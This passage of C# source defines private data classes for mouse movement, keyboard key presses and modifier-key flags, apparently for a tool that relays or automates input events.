    }

    private class MouseMoveData
    {
        public int X { get; set; }
        public int Y { get; set; }
        public int? MonitorId { get; set; }
    }

    private class KeyboardInputData
    {
        public string Key { get; set; } = "";
        public string Action { get; set; } = "press";
        public KeyboardModifiers? Modifiers { get; set; }
    }

    private class KeyboardModifiers
    {
        public bool? Ctrl { get; set; }
        public bool? Alt { get; set; }
        public bool? Shift { get; set; }
        public bool? Win { get; set; }
    }}
